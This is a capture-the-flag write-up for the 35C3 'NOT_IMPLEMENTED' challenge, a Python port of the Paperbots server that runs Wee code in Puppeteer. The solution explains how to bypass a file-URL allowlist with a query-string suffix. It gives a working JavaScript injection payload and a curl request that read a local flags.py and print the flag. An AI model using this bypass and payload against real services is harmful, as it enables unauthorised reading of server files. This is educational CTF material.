# Challenge NOT_IMPLEMENTED

500 Points

## Challenge

NOT_IMPLEMENTED was not implemented nor intended. Capture it and profit.

http://35.207.132.47

Difficulty estimate: Hard++

Good coders should learn one new language every year.

InfoSec folks are even used to learn one new language for every new problem they face (YMMV).

If you have not picked up a new challenge in 2018, you're in for a treat.

We took the new and upcoming Wee programming language from paperbots.io. Big shout-out to Mario Zechner (@badlogicgames) at this point.

Some cool Projects can be created in Wee, like: this, this and that.

Since we already know Java, though, we ported the server (Server.java and Paperbots.java) to Python (WIP) and constantly add awesome functionality. Get the new open-sourced server at /pyserver/server.py.

Anything unrelated to the new server is left unchanged from commit dd059961cbc2b551f81afce6a6177fcf61133292 at badlogics paperbot github (mirrored up to this commit here).

We even added new features to this better server, like server-side Wee evaluation!

To make server-side Wee the language of the future, we already implemented awesome runtime functions. To make sure our VM is 100% safe and secure, there are also assertion functions in server-side Wee that you don't have to be concerned about.

Hints:
- Once you dug through every layer, you have reached the core. From there you may chose any direction and move anywhere.



## Solution

The only place in the server.py where the NOT_IMPLEMENTED is referenced is in the following request:

```
@app.route("/pyserver/flags.py", methods=["GET"])
def server_flags():
    return Response("""
DB_SECRET = "35C3_???"
DECRYPTED = "35C3_???"
DEV_NULL =  "35C3_???"
LOCALHOST = "35C3_???"
LOGGED_IN = "35C3_???"
NOT_IMPLEMENTED = "35C3_???"
    """, mimetype='text/x-python')
```

But the flag "NOT_IMPLEMENTED" is not imported into the server.py, only the other flags:

```
from flags import DB_SECRET, DECRYPTED, DEV_NULL, LOCALHOST, LOGGED_IN
```

So we need to read the file flags.py from the server. Luckily, the weeterpreter.ts allow us to execute javascript code in a Puppeteer environment. The environment is configurated to not load files except the ones that pass the following check:

```
page.on('request', r=> (r.url().startsWith("file://") && (
        r.url().endsWith("weelang/pypyjs.html") ||
        r.url().endsWith("lib/FunctionPromise.js") ||
        r.url().endsWith("lib/pypyjs.js") ||
        r.url().endsWith("lib/pypyjs.vm.js") ||
        r.url().endsWith("lib/pypyjs.vm.js.zmem")
    ) ? r.continue() : r.abort() && console.log("blocked", r.url()))
)
```

This check is not really save, since we can request a file any file and just append ?lib/pypyjs.js to the file and pass the check.

After some tries, it was possible for us to load the flags.py as javascript code (luckily for us the python code to define the flags is also valid javascript code). But it seems like our additional code gets executed before the flag.py could load and NOT_IMPLEMENTED as always not defined.

But it seems like the puppeteer browser is only created once per request, so we could execute multiple evals and wait a little between them. This gives puppeteer time to load flags.py. After some try-and-error this is a successfull payload:

```
alert(
  eval('
    inject = document.createElement(`script`);
    inject.src=`../pyserver/flags.py?lib/pypyjs.js`;
    document.head.append(inject);
  ')
)
eval('
  function sleepFor( sleepDuration ){
    var now = new Date().getTime();
    while(new Date().getTime() < now + sleepDuration){}
  }
  sleepFor(1000);
')
alert(eval('NOT_IMPLEMENTED'))
```

The flags.py file is loaded first as external javascript. Then we busy wait for 1 second to make sure the file was loaded. After that we can simply "alert" the flag.

Final execution:
```
root@blackbox:# curl -X POST -d @payload.txt "http://35.207.132.47/wee/run"
{"code":"  [removed for readability]","result":"undefined\n35C3_I_AM_TOO_LAZY_TO_BUILD_THIS_JUST_TAKE_THE_FLAG_JEEZ\n"}
```

Flag: 35C3_I_AM_TOO_LAZY_TO_BUILD_THIS_JUST_TAKE_THE_FLAG_JEEZ
